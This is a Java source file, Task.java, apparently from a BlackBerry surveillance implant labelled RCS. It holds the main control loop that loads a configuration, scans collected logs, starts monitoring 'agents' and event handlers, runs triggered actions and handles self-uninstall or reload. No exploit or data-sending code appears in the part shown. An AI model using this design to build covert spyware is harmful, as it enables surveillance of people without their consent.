/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib 
 * File         : Task.java 
 * Created      : 26-mar-2010
 * *************************************************/

package blackberry;

import java.util.Vector;

import blackberry.action.Action;
import blackberry.action.SubAction;
import blackberry.log.LogCollector;
import blackberry.utils.Debug;
import blackberry.utils.DebugLevel;
import blackberry.utils.Utils;

// TODO: Auto-generated Javadoc
/**
 * The Class Task.
 */
public class Task {

    private static final int SLEEPING_TIME = 1000;

    /** The debug instance. */
    //#debug
    private static Debug debug = new Debug("Task", DebugLevel.VERBOSE);

    /** The conf. */
    Conf conf = null;

    /** The status. */
    Status status = null;

    /** The device. */
    Device device = null;

    /** The log collector. */
    LogCollector logCollector = null;

    /** The event manager. */
    EventManager eventManager = null;

    /** The agent manager. */
    AgentManager agentManager = null;

    /**
     * Instantiates a new task.
     */
    public Task() {
        // Istanziamo qui tutti gli oggetti singleton dopo aver inizializzato le
        // code
        status = Status.getInstance();
        device = Device.getInstance();
        logCollector = LogCollector.getInstance();

        eventManager = EventManager.getInstance();
        agentManager = AgentManager.getInstance();
    }

    /**
     * Check actions.
     * 
     * @return true, if successful
     */
    public synchronized boolean checkActions() {
        Utils.sleep(1000);

        for (;;) {

            debug.trace("checkActions");
            final int[] actionIds = this.status.getActionIdTriggered();

            final int asize = actionIds.length;
            if (asize > 0) {

                for (int k = 0; k < asize; ++k) {
                    final int actionId = actionIds[k];
                    final Action action = status.getAction(actionId);

                    if (action.isTriggered() == false) {
                        //#debug
                        debug.warn("Should be triggered");
                        continue;
                    }

                    // #debug
                    debug.trace("CheckActions() triggered" + action);
                    action.setTriggered(false, null);

                    final Vector subActions = action.getSubActionsList();

                    final int ssize = subActions.size();
                    for (int j = 0; j < ssize; ++j) {

                        final SubAction subAction = (SubAction) subActions
                                .elementAt(j);
                        final boolean ret = subAction.execute(action
                                .getTriggeringEvent());

                        if (ret == false) {
                            //#debug
                            debug.warn("CheckActions() error executing: "+subAction);
                            break;
                        }

                        if (subAction.wantUninstall()) {
                            // #debug
                            debug.warn("CheckActions() uninstalling");
                            agentManager.stopAll();
                            eventManager.stopAll();
                            return false;
                        }

                        if (subAction.wantReload()) {
                            // #debug
                            debug.warn("CheckActions() reloading");
                            agentManager.stopAll();
                            eventManager.stopAll();
                            return true;
                        }
                    }
                }
            }
            Utils.sleep(SLEEPING_TIME);
        }

    }

    /**
     * Task init.
     * 
     * @return true, if successful
     */
    public boolean taskInit() {
        // #debug
        debug.trace("TaskInit");

        agentManager.stopAll();
        eventManager.stopAll();

        if (device != null) {
            device.refreshData();
        }

        conf = new Conf();

        if (conf.load() == false) {
            // #debug
            debug.trace("TaskInit - Load Conf FAILED");

            return false;
        }

        Msg.demo("Configuration... OK\n");

        if (logCollector != null) {
            logCollector.scanLogs();
        }

        // Da qui in poi inizia la concorrenza dei thread
        if (eventManager.startAll() == false) {
            // #debug
            debug.trace("TaskInit - eventManager FAILED");
            return false;
        }

        // #debug
        debug.info("TaskInit - agents started");

        if (agentManager.startAll() == false) {
            // #debug
            debug.trace("TaskInit - agentManager FAILED");
            return false;
        }

        // #debug
        debug.info("TaskInit - agents started");
        return true;
    }
}